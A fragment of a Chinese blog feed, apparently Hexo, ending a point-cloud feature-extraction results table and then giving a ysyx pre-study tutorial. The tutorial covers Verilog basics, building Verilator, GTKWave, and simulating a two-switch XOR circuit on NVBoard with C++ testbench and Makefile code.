<td align="center"><strong>60</strong></td>
</tr>
<tr>
<td align="center"><strong>0.4</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>59</strong></td>
</tr>
<tr>
<td align="center"><strong>0.3</strong></td>
<td align="center"><strong>55</strong></td>
<td align="center"><strong>55</strong></td>
<td align="center"><strong>57</strong></td>
</tr>
<tr>
<td align="center"><strong>0.2</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>44</strong></td>
</tr>
<tr>
<td align="center"><strong>0.1</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>47</strong></td>
</tr>
<tr>
<td align="center"><strong>0.075</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
</tr>
<tr>
<td align="center"><strong>0.050</strong></td>
<td align="center"><strong>56</strong></td>
<td align="center"><strong>56</strong></td>
<td align="center"><strong>56</strong></td>
</tr>
<tr>
<td align="center"><strong>0.025</strong></td>
<td align="center"><strong>56</strong></td>
<td align="center"><strong>10</strong></td>
<td align="center"><strong>56</strong></td>
</tr>
<tr>
<td align="center"><strong>0.000</strong></td>
<td align="center"><strong>61</strong></td>
<td align="center"><strong>0</strong></td>
<td align="center"><strong>61</strong></td>
</tr>
</tbody></table>
<p><strong>曲面：</strong></p>
<table>
<thead>
<tr>
<th align="center"><strong>斜面</strong></th>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"><strong>融合</strong></td>
<td align="center"><strong>曲率</strong></td>
<td align="center"><strong>边界</strong></td>
</tr>
<tr>
<td align="center"><strong>1</strong></td>
<td align="center"><strong>77</strong></td>
<td align="center"><strong>77</strong></td>
<td align="center"><strong>73</strong></td>
</tr>
<tr>
<td align="center"><strong>0.9</strong></td>
<td align="center"><strong>77</strong></td>
<td align="center"><strong>77</strong></td>
<td align="center"><strong>70</strong></td>
</tr>
<tr>
<td align="center"><strong>0.8</strong></td>
<td align="center"><strong>78</strong></td>
<td align="center"><strong>78</strong></td>
<td align="center"><strong>73</strong></td>
</tr>
<tr>
<td align="center"><strong>0.7</strong></td>
<td align="center"><strong>78</strong></td>
<td align="center"><strong>78</strong></td>
<td align="center"><strong>72</strong></td>
</tr>
<tr>
<td align="center"><strong>0.6</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>71</strong></td>
</tr>
<tr>
<td align="center"><strong>0.5</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>73</strong></td>
</tr>
<tr>
<td align="center"><strong>0.4</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>47</strong></td>
</tr>
<tr>
<td align="center"><strong>0.3</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>47</strong></td>
</tr>
<tr>
<td align="center"><strong>0.2</strong></td>
<td align="center"><strong>72</strong></td>
<td align="center"><strong>72</strong></td>
<td align="center"><strong>30</strong></td>
</tr>
<tr>
<td align="center"><strong>0.1</strong></td>
<td align="center"><strong>74</strong></td>
<td align="center"><strong>74</strong></td>
<td align="center"><strong>47</strong></td>
</tr>
<tr>
<td align="center"><strong>0.075</strong></td>
<td align="center"><strong>69</strong></td>
<td align="center"><strong>70</strong></td>
<td align="center"><strong>28</strong></td>
</tr>
<tr>
<td align="center"><strong>0.050</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>19</strong></td>
<td align="center"><strong>72</strong></td>
</tr>
<tr>
<td align="center"><strong>0.025</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>6</strong></td>
<td align="center"><strong>76</strong></td>
</tr>
<tr>
<td align="center"><strong>0.000</strong></td>
<td align="center"><strong>76</strong></td>
<td align="center"><strong>0</strong></td>
<td align="center"><strong>76</strong></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>特征提取</tag>
        <tag>PCL</tag>
        <tag>C++</tag>
        <tag>融合</tag>
      </tags>
  </entry>
  <entry>
    <title>ysyx-预学习阶段</title>
    <url>/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/</url>
    <content><![CDATA[<h1 id="1-预学习"><a href="#1-预学习" class="headerlink" title="1.预学习"></a>1.预学习</h1><p><strong>主要参考</strong>：</p>
<ol>
<li><a href="https://ysyx.oscc.cc/docs/2306/prestudy/0.4.html">搭建verilator仿真环境 | 官方文档 (oscc.cc)</a></li>
</ol>
<p><strong>Verilog基本语法：</strong> — GPT4.0</p>
<p>Verilog 语言是一种用于电子设计自动化和硬件描述的硬件描述语言（HDL）。它使设计者能够以文本形式描述复杂的电子系统。Verilog 的基本语法元素包括：</p>
<p><strong>1. 模块 (Modules)</strong></p>
<p>模块是 Verilog 中的基本结构单元，用于封装硬件设计的各个部分。一个模块可以表示一个简单的门电路，一个复杂的微处理器，或者任何中间规模的组件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy codemodule moduleName(input input1, output output1);</span><br><span class="line">  // 模块体</span><br><span class="line">endmodule</span><br></pre></td></tr></table></figure>

<p><strong>2. 数据类型</strong></p>
<ul>
<li><strong>网线 (wire)</strong>: 用于连接模块内部的组件，或模块间的连接。它代表一个物理连接，可以携带一个信号。</li>
<li><strong>寄存器 (reg)</strong>: 用于在模块内部存储值。与 wire 不同，reg 可以保持其值，直到被新的值更新。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy codewire w; // 声明一个 wire 类型的变量</span><br><span class="line">reg r;  // 声明一个 reg 类型的变量</span><br></pre></td></tr></table></figure>

<p><strong>3. 运算符</strong></p>
<p>Verilog 提供了多种运算符，包括算术运算符、逻辑运算符、比较运算符等。</p>
<ul>
<li><strong>算术运算符</strong>: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code> (取余)</li>
<li><strong>逻辑运算符</strong>: <code>&amp;&amp;</code> (与), <code>||</code> (或), <code>!</code> (非)</li>
<li><strong>比较运算符</strong>: <code>==</code> (等于), <code>!=</code> (不等于), <code>&lt;</code> (小于), <code>&gt;</code> (大于), <code>&lt;=</code> (小于等于), <code>&gt;=</code> (大于等于)</li>
<li><strong>位运算符</strong>: <code>&amp;</code> (位与), <code>|</code> (位或), <code>^</code> (异或), <code>~</code> (位非), <code>&lt;&lt;</code> (左移), <code>&gt;&gt;</code> (右移)</li>
</ul>
<p><strong>4. 赋值语句</strong></p>
<ul>
<li><strong>连续赋值</strong>: 用于为 wire 类型变量赋值。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy code</span><br><span class="line">assign w = expression;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>过程赋值</strong>: 包括 <code>always</code> 和 <code>initial</code> 语句块内的赋值，主要用于为 reg 类型变量赋值。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy codealways @(trigger) begin</span><br><span class="line">  r = expression;</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p><strong>5. 控制结构</strong></p>
<ul>
<li><strong>条件语句</strong>: 如 <code>if</code>, <code>case</code> 用于实现条件逻辑。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy codeif (condition) begin</span><br><span class="line">  // 代码</span><br><span class="line">end else begin</span><br><span class="line">  // 代码</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>循环语句</strong>: 如 <code>for</code>, <code>while</code> 用于实现循环。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy codefor (initialization; condition; increment) begin</span><br><span class="line">  // 代码</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p><strong>6. 实例化 (Instantiation)</strong></p>
<p>用于在一个模块内部创建另一个模块的实例，允许模块复用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy code</span><br><span class="line">moduleName instanceName(.input1(signal1), .output1(signal2));</span><br></pre></td></tr></table></figure>

<p><strong>7. 任务和函数</strong></p>
<ul>
<li><strong>任务 (task)</strong>: 用于封装可以执行多个语句的代码块，可以有输入和输出参数，但不返回值。</li>
<li><strong>函数 (function)</strong>: 用于封装执行单个返回值的代码块，可以有输入参数。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verilogCopy codetask taskName; </span><br><span class="line">  // 任务体</span><br><span class="line">endtask</span><br><span class="line"></span><br><span class="line">function functionName; </span><br><span class="line">  // 函数体</span><br><span class="line">endfunction</span><br></pre></td></tr></table></figure>

<h2 id="1-1verilator仿真环境搭建"><a href="#1-1verilator仿真环境搭建" class="headerlink" title="1.1verilator仿真环境搭建"></a>1.1verilator仿真环境搭建</h2><h3 id="verilator："><a href="#verilator：" class="headerlink" title="verilator："></a><strong>verilator：</strong></h3><p>Verilator 是一款开源的硬件描述语言（HDL）模拟器，<strong>它主要用于将 Verilog 代码转换成 C++ 或 SystemC 代码</strong>，进而允许在仿真环境中高效地执行硬件设计。这款工具特别适合于大规模复杂的数字设计项目，因为它在处理大型代码库时速度非常快，同时也支持大部分 Verilog-2005 标准的特性。</p>
<p><strong>主要特点</strong></p>
<ul>
<li><strong>高性能</strong>：Verilator 生成的模拟代码是编译型的，与解释型仿真器相比，这可以显著提升仿真速度。</li>
<li><strong>开源</strong>：作为一个开源工具，Verilator 受到了广泛的社区支持，用户可以自由地使用、修改和分发它。</li>
<li><strong>灵活性</strong>：Verilator 允许用户通过 C++ 或 SystemC 代码与仿真模型进行交互，这为高级仿真提供了极大的灵活性。</li>
<li><strong>支持多种操作系统</strong>：包括 Linux、macOS 和 Windows，使其适用于多种开发环境。</li>
</ul>
<p><strong>以上来自 GPT4.0</strong></p>
<h3 id="安装verilator"><a href="#安装verilator" class="headerlink" title="安装verilator"></a><strong>安装verilator</strong></h3><p><strong>按照环境依赖：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install help2man</span><br><span class="line">sudo apt-get install git perl python3 make autoconf g++ flex bison ccache</span><br><span class="line">sudo apt-get install libgoogle-perftools-dev numactl perl-doc</span><br><span class="line">sudo apt-get install libfl2  # Ubuntu only (ignore if gives error)</span><br><span class="line">sudo apt-get install libfl-dev  # Ubuntu only (ignore if gives error)</span><br><span class="line">sudo apt-get install zlibc zlib1g zlib1g-dev  # Ubuntu only </span><br></pre></td></tr></table></figure>

<p>最后一条会报错，暂时忽略它</p>
<p>然后在新建一个文件夹用于存放源码，使用git命令克隆</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/verilator/verilator</span><br></pre></td></tr></table></figure>



<p>切换到<code>v5.008</code>版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd verilator</span><br><span class="line">git chechout v5.008</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后使用下面命令进行安装</span></span><br><span class="line">autoconf</span><br><span class="line">unset VERILATOR_ROOT</span><br><span class="line">./configure</span><br><span class="line">make -j `nproc`</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最后</span></span><br><span class="line">sudo make install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检测安装的版本</span></span><br><span class="line">verilator --version</span><br></pre></td></tr></table></figure>

<p><img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240408214422838.png" alt="image-20240408214422838"></p>
<h3 id="安装波型查看器GTKwave"><a href="#安装波型查看器GTKwave" class="headerlink" title="安装波型查看器GTKwave"></a>安装波型查看器GTKwave</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gtkwave</span><br></pre></td></tr></table></figure>



<p><strong>至此 环境配置搭建完成</strong></p>
<h3 id="verilator示例："><a href="#verilator示例：" class="headerlink" title="verilator示例："></a>verilator示例：</h3><p>在官方手册中：<a href="https://www.veripool.org/ftp/verilator_doc.pdf">Verilator (veripool.org)</a></p>
<p>根据示例进行操作</p>
<h4 id="创建二进制的执行文件"><a href="#创建二进制的执行文件" class="headerlink" title="创建二进制的执行文件"></a><strong>创建二进制的执行文件</strong></h4><p>新建一个verilog 文件 然后写入文件内容“</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">cat &gt;our<span class="variable">.v</span> &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line"><span class="keyword">module</span> our;</span><br><span class="line"><span class="keyword">initial</span> <span class="keyword">begin</span> <span class="built_in">$display</span>(<span class="string">&quot;Hello World&quot;</span>); <span class="built_in">$finish</span>; <span class="keyword">end</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>编译文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">verilator --binary -j 0 -Wall our.v</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--binary 创建一切所需要的可执行文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-j 0 尽可能多使用cpu 的线程</span></span><br></pre></td></tr></table></figure>

<p> 运行文件并输出：</p>
<p><img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240409111720849.png" alt="image-20240409111720849"></p>
<hr>
<h4 id="创建c-执行文件"><a href="#创建c-执行文件" class="headerlink" title="创建c++执行文件"></a><strong>创建c++执行文件</strong></h4><p>根据示例创建即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir test_our</span><br><span class="line">cd test_our</span><br><span class="line">cat &gt;our.v &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line">	module our;</span><br><span class="line">	initial begin $display(&quot;Hello World&quot;); $finish; end</span><br><span class="line">	endmodule</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;sim_main.cpp &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">include <span class="string">&quot;Vour.h&quot;</span></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">include <span class="string">&quot;verilated.h&quot;</span></span></span><br><span class="line">	int main(int argc, char** argv) &#123;</span><br><span class="line">		VerilatedContext* contextp = new VerilatedContext;</span><br><span class="line"><span class="meta prompt_">		contextp-&gt;</span><span class="language-bash">commandArgs(argc, argv);</span></span><br><span class="line">		Vour* top = new Vour&#123;contextp&#125;;</span><br><span class="line">		while (!contextp-&gt;gotFinish()) &#123; top-&gt;eval(); &#125;</span><br><span class="line">		delete top;</span><br><span class="line">		delete contextp;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译 --cc c++输出 --exe 创建一个可执行文件 --build 调用cmake</span> </span><br><span class="line">verilator --cc --exe --build -j 0 -Wall sim_main.cpp our.v</span><br></pre></td></tr></table></figure>



<h3 id="双控开关"><a href="#双控开关" class="headerlink" title="双控开关"></a>双控开关</h3><p>做这个之前先可以做一些官方教程指代的DUT实验，通过DUT 可以了解波形输出之类的</p>
<p>下面是双控开关：双控开关是一个应用通过两个开关（a，b）联合控制一盏灯的亮灭</p>
<p>Verilog 顶层模块代码 top.v文件</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="comment">// top模块 模块定义</span></span><br><span class="line"><span class="keyword">module</span> top(</span><br><span class="line">  <span class="keyword">input</span> a,  <span class="comment">// 输入端口</span></span><br><span class="line">  <span class="keyword">input</span> b,  <span class="comment">// 输入端口</span></span><br><span class="line">  <span class="keyword">output</span> f  <span class="comment">// 输出端口</span></span><br><span class="line">);</span><br><span class="line">  <span class="keyword">assign</span> f = a ^ b;  <span class="comment">// 功能实现</span></span><br><span class="line"><span class="keyword">endmodule</span>  <span class="comment">// 模块定义结束</span></span><br></pre></td></tr></table></figure>

<p>使用指令将Verilog代码转换为C++代码</p>
<blockquote>
<p>verilator –cc top.v</p>
</blockquote>
<p>创建sim_main.cpp 文件 并在文件中添加记录波形代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sim_main.cpp</span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;verilated.h&gt;</span>        <span class="comment">// 访问验证程序例程的库</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;verilated_vcd_c.h&gt;</span>  <span class="comment">// 向VCD文件中写入波形</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Vtop.h&quot;</span>             <span class="comment">// 包含top模型的顶层文件</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> MAX_SIM_TIME 20       <span class="comment">// 最大仿真时间</span></span></span><br><span class="line"> <span class="type">vluint64_t</span> sim_time = <span class="number">0</span>;</span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">     <span class="comment">//构建VerilatedContext以保留模拟时间</span></span><br><span class="line">     VerilatedContext* contextp = <span class="keyword">new</span> VerilatedContext;</span><br><span class="line">     contextp-&gt;<span class="built_in">commandArgs</span>(argc, argv);</span><br><span class="line">     <span class="comment">//用VerilatedContext实例化自己的顶层类</span></span><br><span class="line">     Vtop* top = <span class="keyword">new</span> Vtop&#123;contextp&#125;;</span><br><span class="line">     <span class="comment">//开启波形追踪</span></span><br><span class="line">     Verilated::<span class="built_in">traceEverOn</span>(<span class="literal">true</span>);</span><br><span class="line">     VerilatedVcdC *m_trace = <span class="keyword">new</span> VerilatedVcdC;</span><br><span class="line">     top-&gt;<span class="built_in">trace</span>(m_trace, <span class="number">5</span>); <span class="comment">//顶层类设置测试波形参数</span></span><br><span class="line">     m_trace-&gt;<span class="built_in">open</span>(<span class="string">&quot;waveform.vcd&quot;</span>); <span class="comment">//设置波形写入的文件</span></span><br><span class="line">     </span><br><span class="line">     <span class="keyword">while</span> (sim_time &lt; MAX_SIM_TIME) &#123;</span><br><span class="line">         <span class="type">int</span> a = <span class="built_in">rand</span>() &amp;<span class="number">1</span>;</span><br><span class="line">         <span class="type">int</span> b = <span class="built_in">rand</span>() &amp;<span class="number">1</span>;</span><br><span class="line">         top-&gt;a = a; <span class="comment">//实例化模型的信号赋值</span></span><br><span class="line">         top-&gt;b = b;</span><br><span class="line">         top-&gt;<span class="built_in">eval</span>(); <span class="comment">//评估信号    </span></span><br><span class="line">         m_trace-&gt;<span class="built_in">dump</span>(sim_time); <span class="comment">//将信号写入波形</span></span><br><span class="line">         sim_time++;        </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;a = %d, b = %d,f = %d\n&quot;</span>,a,b,top-&gt;f);</span><br><span class="line">         <span class="built_in">assert</span>(top-&gt;f == (a^b));</span><br><span class="line">     &#125;</span><br><span class="line">     m_trace-&gt;<span class="built_in">close</span>();</span><br><span class="line">     top-&gt;<span class="built_in">final</span>();</span><br><span class="line">     <span class="keyword">delete</span> top;    <span class="comment">// 删除开辟的内存</span></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用下面指令重新链接</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">verilator -Wall--trace -cc top.v --exe sim_main.cpp</span><br><span class="line">make -C obj_dir -f Vtop.mk Vtop</span><br><span class="line">./obj_dir/Vtop  #运行可执行程序</span><br><span class="line">gtkwave waveform.vcd  # 可视化波形信号</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240409203828500.png" alt="image-20240409203828500"></p>
<h3 id="接入nvboard"><a href="#接入nvboard" class="headerlink" title="接入nvboard"></a>接入nvboard</h3><p>阅读文件夹中的readme文件</p>
<blockquote>
<p>#安装依赖</p>
<p>sudo apt-get install libsdl2-dev libsdl2-image-dev libsdl2-ttf-dev</p>
<p>#添加环境变量</p>
<p>export NVBOARD_HOME&#x3D;&#x2F;home&#x2F;liangzhou&#x2F;Desktop&#x2F;ysyx&#x2F;ysyx-workbench&#x2F;nvboard</p>
</blockquote>
<p><img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240409210330340.png" alt="image-20240409210330340"></p>
<p><strong>在nvboard 上实现双控开关</strong></p>
<p>要想在nvboard上实现双控开关，得先弄懂nvboard 的工作原理 用</p>
<blockquote>
<p>先使用make clean 清空编译的文件，然后用tree命令查看 example文件夹结构</p>
<p>constr中的top.nxdc文件  用于引脚绑定 用法可见readme文件</p>
<p>csrc中的main.cpp文件  实现代码</p>
<p>vsrc 包含Verilog代码</p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412204540650.png" alt="image-20240412204540650" style="zoom: 67%;">



<p>所以我们想要在 nvboard上实现双控开关  </p>
<ol>
<li>将双控开关的top.v文件放在vsrc文件中</li>
<li>在top.nxdc中 定义接口  定义规则见 readme文档<ol>
<li><img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412205440885.png" alt="image-20240412205440885"></li>
</ol>
</li>
<li>修改main.c代码</li>
<li>修改makefile文件</li>
</ol>
<p>下面是修改的文件内容</p>
<blockquote>
<p>top.v</p>
</blockquote>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> top(</span><br><span class="line">  <span class="keyword">input</span> a,</span><br><span class="line">  <span class="keyword">input</span> b,</span><br><span class="line">  <span class="keyword">output</span> f</span><br><span class="line">);</span><br><span class="line">  <span class="keyword">assign</span> f = a ^ b;</span><br><span class="line">  <span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>main.cpp</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;nvboard.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Vtop.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;verilated.h&gt;</span>   <span class="comment">//访问验证程序例程的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;verilated_vcd_c.h&gt;</span>  <span class="comment">//向VCD文件中写入波形</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TOP_NAME dut;     <span class="comment">// 创建dut对象 TOP_NAME宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">nvboard_bind_all_pins</span><span class="params">(TOP_NAME* top)</span></span>;  <span class="comment">// 将所有引脚绑定nvboard</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">nvboard_bind_all_pins</span>(&amp;dut);</span><br><span class="line">  <span class="built_in">nvboard_init</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">nvboard_update</span>();</span><br><span class="line">    dut.<span class="built_in">eval</span>(); <span class="comment">//评估信号  </span></span><br><span class="line">    <span class="built_in">assert</span>(dut.f == (dut.a^dut.b));  <span class="comment">// 断言句 用来检测仿真结果是否是预测结果</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Makefile</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">TOPNAME = top  <span class="comment">#顶层模块名称</span></span><br><span class="line">NXDC_FILES = constr/top.nxdc  <span class="comment">#定义nxdc模块</span></span><br><span class="line">INC_PATH ?=</span><br><span class="line"></span><br><span class="line">VERILATOR = verilator</span><br><span class="line">VERILATOR_CFLAGS += -MMD --build -cc  \</span><br><span class="line">				-O3 --x-assign fast --x-initial fast --noassert</span><br><span class="line"></span><br><span class="line">BUILD_DIR = ./build</span><br><span class="line">OBJ_DIR = <span class="variable">$(BUILD_DIR)</span>/obj_dir</span><br><span class="line">BIN = <span class="variable">$(BUILD_DIR)</span>/<span class="variable">$(TOPNAME)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#默认的路径</span></span><br><span class="line"><span class="section">default: <span class="variable">$(BIN)</span></span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p <span class="variable">$(BUILD_DIR)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># constraint file  引脚自动绑定</span></span><br><span class="line">SRC_AUTO_BIND = <span class="variable">$(<span class="built_in">abspath</span> <span class="variable">$(BUILD_DIR)</span>/auto_bind.cpp)</span></span><br><span class="line"><span class="variable">$(SRC_AUTO_BIND)</span>: <span class="variable">$(NXDC_FILES)</span></span><br><span class="line">	python3 <span class="variable">$(NVBOARD_HOME)</span>/scripts/auto_pin_bind.py <span class="variable">$^</span> <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># project source</span></span><br><span class="line">VSRCS = <span class="variable">$(<span class="built_in">shell</span> find $(<span class="built_in">abspath</span> ./vsrc)</span> -name <span class="string">&quot;*.v&quot;</span>)</span><br><span class="line">CSRCS = <span class="variable">$(<span class="built_in">shell</span> find $(<span class="built_in">abspath</span> ./csrc)</span> -name <span class="string">&quot;*.c&quot;</span> -or -name <span class="string">&quot;*.cc&quot;</span> -or -name <span class="string">&quot;*.cpp&quot;</span>)</span><br><span class="line">CSRCS += <span class="variable">$(SRC_AUTO_BIND)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rules for NVBoard</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(NVBOARD_HOME)</span>/scripts/nvboard.mk</span><br><span class="line"></span><br><span class="line"><span class="comment"># rules for verilator</span></span><br><span class="line">INCFLAGS = <span class="variable">$(<span class="built_in">addprefix</span> -I, <span class="variable">$(INC_PATH)</span>)</span></span><br><span class="line">CXXFLAGS += <span class="variable">$(INCFLAGS)</span> -DTOP_NAME=<span class="string">&quot;\&quot;V<span class="variable">$(TOPNAME)\&quot;</span>&quot;</span></span><br><span class="line"><span class="comment"># @表示静默运行</span></span><br><span class="line"><span class="variable">$(BIN)</span>: <span class="variable">$(VSRCS)</span> <span class="variable">$(CSRCS)</span> <span class="variable">$(NVBOARD_ARCHIVE)</span></span><br><span class="line">	@rm -rf <span class="variable">$(OBJ_DIR)</span></span><br><span class="line">	<span class="variable">$(VERILATOR)</span> <span class="variable">$(VERILATOR_CFLAGS)</span> \</span><br><span class="line">		--top-module <span class="variable">$(TOPNAME)</span> <span class="variable">$^</span> \</span><br><span class="line">		<span class="variable">$(<span class="built_in">addprefix</span> -CFLAGS , <span class="variable">$(CXXFLAGS)</span>)</span> <span class="variable">$(<span class="built_in">addprefix</span> -LDFLAGS , <span class="variable">$(LDFLAGS)</span>)</span> \</span><br><span class="line">		--Mdir <span class="variable">$(OBJ_DIR)</span> --exe -o <span class="variable">$(<span class="built_in">abspath</span> <span class="variable">$(BIN)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: default</span></span><br><span class="line"><span class="comment"># 使用所有前置条件作为输入来执行命令，但不在终端上回显这个命令”</span></span><br><span class="line"><span class="section">run: <span class="variable">$(BIN)</span></span></span><br><span class="line">	@<span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf <span class="variable">$(BUILD_DIR)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: default all clean run</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">sim:</span></span><br><span class="line">	<span class="variable">$(<span class="built_in">call</span> git_commit, &quot;sim RTL&quot;)</span> <span class="comment"># DO NOT REMOVE THIS LINE!!!</span></span><br><span class="line">	verilator --Wall --trace -cc ./vsrc/top.v --exe ./csrc/main.cpp</span><br><span class="line">	make -C obj_dir -f Vtop.mk Vtop ./nvboard.a -lsDL2 -lSDL2_image</span><br></pre></td></tr></table></figure>



<blockquote>
<p>初始状态：</p>
</blockquote>
